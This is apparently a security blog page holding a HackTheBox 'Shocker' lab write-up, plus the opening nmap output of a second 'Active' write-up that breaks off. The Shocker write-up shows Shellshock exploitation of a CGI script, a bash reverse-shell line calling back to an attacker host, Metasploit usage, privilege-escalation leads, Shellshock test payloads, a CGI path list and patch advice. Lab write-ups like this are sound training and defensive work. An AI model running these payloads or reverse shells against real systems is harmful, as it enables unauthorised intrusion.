<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Unc1e的博客">
<meta property="og:url" content="http://unc1e.com/index.html">
<meta property="og:site_name" content="Unc1e的博客">
<meta property="article:author" content="Unc1e">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://unc1e.com/"/>





  <title>Unc1e的博客</title>
  








<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Unc1e的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/" itemprop="url">HackTheBox笔记：Shocker</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-05T00:45:31+08:00">
                2020-07-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Entry-point"><a href="#Entry-point" class="headerlink" title="Entry point"></a>Entry point</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nmap <span class="literal">-p</span>- <span class="literal">-sC</span> <span class="literal">-sV</span>  <span class="literal">-Pn</span> <span class="number">10.10</span>.<span class="number">10.56</span> <span class="literal">-oA</span> allport</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.56</span></span><br><span class="line">Host is up (<span class="number">0.0037</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">18</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">18</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey:</span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>

<p>hydra to brute SSH using fastrack.txt, nothing to gain.</p>
<h2 id="cgi-bin"><a href="#cgi-bin" class="headerlink" title="/cgi-bin/"></a>/cgi-bin/</h2><p>using <code>binwalk</code> and <code>file</code>, got nothing special<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=bug.jpg&originHeight=420&originWidth=820&size=36861&status=done&style=none&width=410" alt="bug.jpg"><br>dir searching</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56/ -e \*</span><br><span class="line"></span><br><span class="line"><span class="emphasis">_|. _</span> \<span class="emphasis">_ \_</span> \<span class="emphasis">_ \_</span> <span class="emphasis">_|_</span> v0.3.9</span><br><span class="line">(<span class="emphasis">_||| _</span>) (/<span class="emphasis">_(_</span>|| (\_| )</span><br><span class="line"></span><br><span class="line">Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6564 | Request count: 6564</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-07-07_23-26-11.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /opt/dirsearch/reports/10.10.10.56/20-07-07_23-26-16</span><br><span class="line"></span><br><span class="line">[23:26:16] Starting:</span><br><span class="line">[23:28:27] 403 - 299B - /.htaccess-dev</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-local</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-marco</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessBAK</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.txt</span><br><span class="line">[23:28:28] 403 - 302B - /.htaccess.sample</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.old</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.orig</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.save</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.bak1</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessOLD</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccessOLD2</span><br><span class="line">[23:28:28] 403 - 299B - /.htpasswd-old</span><br><span class="line">[23:28:28] 403 - 297B - /.httr-oauth</span><br><span class="line">[23:34:58] 403 - 294B - /cgi-bin/</span><br></pre></td></tr></table></figure>

<p>after obtaining these, no progress.</p>
<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><p>while searching for “<strong>shocker cgi-bin</strong>“, finding a open-source project named <em>shocker, see</em><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> https://github.com/nccgroup/shocker</a><br>add the ext of “<strong>.sh, .cgi</strong>“ in dirbuster,</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200707234227.png&originHeight=230&originWidth=1916&size=18242&status=done&style=none&width=1916" alt="Deepin 截圖_select-area_20200707234227.png"><br>also, <code>dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .cgi,.sh,.php,.py,.pl</code> is supported.</p>
<h2 id="cgi-bin-user-sh"><a href="#cgi-bin-user-sh" class="headerlink" title="/cgi/bin/user.sh"></a>/cgi/bin/user.sh</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Just an uptime test script</span><br><span class="line"></span><br><span class="line">11:46:01 up 1:16, 0 users, load average: 0.00, 0.00, 0.00</span><br></pre></td></tr></table></figure>

<p>the exp of <strong>RCE</strong> can be used at least in 2 ways<br>1st is the <em>shock</em> scirpt</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H 10.10.10.56 -c '/cgi-bin/user.sh'</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png#align=left&display=inline&height=826&margin=%5Bobject%20Object%5D&name=exp.png&originHeight=826&originWidth=1445&size=147075&status=done&style=none&width=1445" alt="exp.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># rce on shocker</span></span><br><span class="line"></span><br><span class="line">\$ /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.122/1337 0&gt;&amp;1</span><br><span class="line">No response</span><br><span class="line"></span><br><span class="line"><span class="section"># get reverse shell</span></span><br><span class="line"></span><br><span class="line">\$ nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">10.10.10.56: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.122] from (UNKNOWN) [10.10.10.56] 55964</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ ls</span><br><span class="line">user.sh</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure>

<p>the 2nd is <strong>msf</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set rhosts 10.10.10.56</span><br><span class="line">rhosts =&gt; 10.10.10.56</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set targeturi /cgi-bin/user.sh</span><br><span class="line">targeturi =&gt; /cgi-bin/user.sh</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Command Stager progress - 100.46% done (1097/1092 bytes)</span><br><span class="line">[*] Sending stage (980808 bytes) to 10.10.10.56</span><br></pre></td></tr></table></figure>

<h1 id="priv-esc"><a href="#priv-esc" class="headerlink" title="priv esc"></a>priv esc</h1><h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for shelly on Shocker:</span><br><span class="line">env<span class="emphasis">_reset, mail_</span>badpass,</span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User shelly may run the following commands on Shocker:</span><br><span class="line">(root) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure>

<h2 id="priv-esc-via-lxd"><a href="#priv-esc-via-lxd" class="headerlink" title="priv esc via lxd"></a>priv esc via lxd</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\$ cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">\$ id</span><br><span class="line">uid=1000(shelly) ... 110(lxd) ...</span><br></pre></td></tr></table></figure>

<h1 id="Note-on-ShellShock"><a href="#Note-on-ShellShock" class="headerlink" title="Note on ShellShock"></a>Note on ShellShock</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg#align=left&display=inline&height=511&margin=%5Bobject%20Object%5D&originHeight=511&originWidth=395&size=0&status=done&style=none&width=395" alt=""></p>
<blockquote>
<p>GNU Bash 4.3 及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用 Bash Shell 之前可以用构造的值创建环境变量。这些变量可以包含代码，在 Shell 被调用后会被立即执行。<br>以下几点值得特别注意：</p>
<ul>
<li>这个漏洞的英文是：ShellShock，中文名被 XCERT 命名为：破壳漏洞。</li>
<li>来自 CVSS 的评分：破壳漏洞的严重性被定义为 10 级（最高），今年 4 月爆发的 OpenSSL“心脏出血”漏洞才 5 级！</li>
<li>破壳漏洞存在有 25 年，和 Bash 年龄一样。</li>
</ul>
<p>GNU Bash &lt;= 4.3，此漏洞可能会影响到</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=89&originWidth=811&size=10652&status=done&style=none&width=811" alt="图片.png"></p>
<ol>
<li>对于 HTTP 头部，CGI 脚本解析器会将其当作环境变量，调用 bash 的 env 相关函数设置到临时环境变量中；</li>
<li>HTTP 协议允许发送任意客户端自定义的 HTTP 头部；</li>
<li>这样就产生了一个完整的可供 Bash 命令注入的场景，客户端故意发送构造好的带攻击命令的 HTTP 头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端。</li>
</ol>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Shellshock 的原理是利用了 Bash 在导入环境变量函数时候的漏洞，启动 Bash 的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些 CGI 脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用 Shellshock 漏洞的机会。<br>目前的 bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“<code>(){</code>”开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。<br>Apache 服务器中使用<code>mod_cgi</code>（不包括<code>mod_php</code>或<code>mod_python</code>）运行脚本的时候，数据是通过环境变量来传递的，这可以算是互联网领域最古老的一些技术了。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>可以使用如下命令来检查系统是否存在此漏洞（在本机 Bash 环境下运行）：<br><strong>破壳 1，CVE-2014-6271</strong>，测试方法：<br><code>env x=&#39;() { :;}; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如执行结果如下表明有漏洞：<code>vulnerable, this is a test</code></p>
<hr>
<p><strong>破壳 2，CVE-2014-7169，</strong>测试方法：<br><code>env -i X=&#39;() { (a)=&gt;\&#39; bash -c &#39;echo date&#39;; cat echo</code><br>如执行结果如下则仍然存在漏洞：<br><code>bash: X: line 1: syntax error near unexpected token =&#39;bash: X: line 1: &#39;bash: error importing function definition for</code>X’Wed Sep 24 14:12:49 PDT 2014`<br>…</p>
<h2 id="Fuzzing-列表"><a href="#Fuzzing-列表" class="headerlink" title="Fuzzing 列表"></a>Fuzzing 列表</h2><p>经过 ZoomEye 的 Fuzzing 探测，Fuzzing 列表如下：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/load.cgi</span><br><span class="line">/cgi-bin/gsweb.cgi</span><br><span class="line">/cgi-bin/redirector.cgi</span><br><span class="line">/cgi-bin/test.cgi</span><br><span class="line">/cgi-bin/index.cgi</span><br><span class="line">/cgi-bin/help.cgi</span><br><span class="line">/cgi-bin/about.cgi</span><br><span class="line">/cgi-bin/vidredirect.cgi</span><br><span class="line">/cgi-bin/click.cgi</span><br><span class="line">/cgi-bin/details.cgi</span><br><span class="line">/cgi-bin/log.cgi</span><br><span class="line">/cgi-bin/viewcontent.cgi</span><br><span class="line">/cgi-bin/content.cgi</span><br><span class="line">/cgi-bin/admin.cgi</span><br><span class="line">/cgi-bin/webmail.cgi</span><br></pre></td></tr></table></figure>

<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>现在可以按照下面方式进行 Bash 的升级修复：</p>
<table>
<thead>
<tr>
<th>操作系统</th>
<th>升级方式</th>
</tr>
</thead>
<tbody><tr>
<td>Ubuntu/Debian</td>
<td>apt-get update</td>
</tr>
<tr>
<td>apt-get install bash</td>
<td></td>
</tr>
<tr>
<td>RedHat/CentOS/Fedora</td>
<td>yum update -y bash</td>
</tr>
<tr>
<td>Arch Linux</td>
<td>pacman -Syu</td>
</tr>
<tr>
<td>OS X</td>
<td>brew update</td>
</tr>
</tbody></table>
<p>brew install bash<br>sudo sh -c ‘echo “/usr/local/bin/bash” &gt;&gt; /etc/shells’<br>chsh -s /usr/local/bin/bash<br>sudo mv /bin/bash /bin/bash-backup<br>sudo ln -s /usr/local/bin/bash /bin/bash |<br>| MacPorts | sudo port self update<br>sudo port upgrade bash |</p>
<p>建议升级后按上面的方法诊断是否补丁完全。</p>
<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>威胁经常在人们不期望它们到来的时候到来，也许是无心的雪崩，也许是有意的蓄谋。“病毒不会在星期天休息”这是安天新员工培训时必须传递的一句话，我们从柏松那里听到过这句话，我们也把这句话讲给过安天的新人。我们也许会在一瞬间被威胁打的措手不及，但不会有威胁能长久的逃逸出我们的感知和分析。<br>谨把我们的工作献给我们家人、我们的战友和我们的祖国</p>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://www.anquanke.com/post/id/179407" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179407</a></li>
<li><a href="https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd" target="_blank" rel="noopener">https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd</a></li>
<li><a href="https://www.jianshu.com/p/66f74282a299" target="_blank" rel="noopener">Shocker</a></li>
<li><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> nccgroup / shocker </a></li>
<li><a href="https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/</a></li>
<li><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></li>
<li><a href="https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt</a></li>
<li><a href="https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html" target="_blank" rel="noopener">https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html</a></li>
<li><a href="https://blog.csdn.net/weixin_33709219/article/details/87981615" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33709219/article/details/87981615</a></li>
<li><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></li>
<li><a href="https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html" target="_blank" rel="noopener">https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Active笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-27T23:09:32+08:00">
                2020-06-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593282512907-313f899a-aeaf-4fd0-ba16-87cc06dacf44.png#align=left&display=inline&height=303&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200628022810.png&originHeight=606&originWidth=1041&size=179864&status=done&style=none&width=521" alt="Deepin 截圖_select-area_20200628022810.png"><br>10.10.10.100</p>
<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	nmap -p- -sC -sV -oA allport.nmap 10.10.10.100</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.0036</span>s latency).</span><br><span class="line">Not shown: <span class="number">65512</span> closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| dns<span class="literal">-nsid</span>:</span><br><span class="line">|_  bind.version: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">30</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: 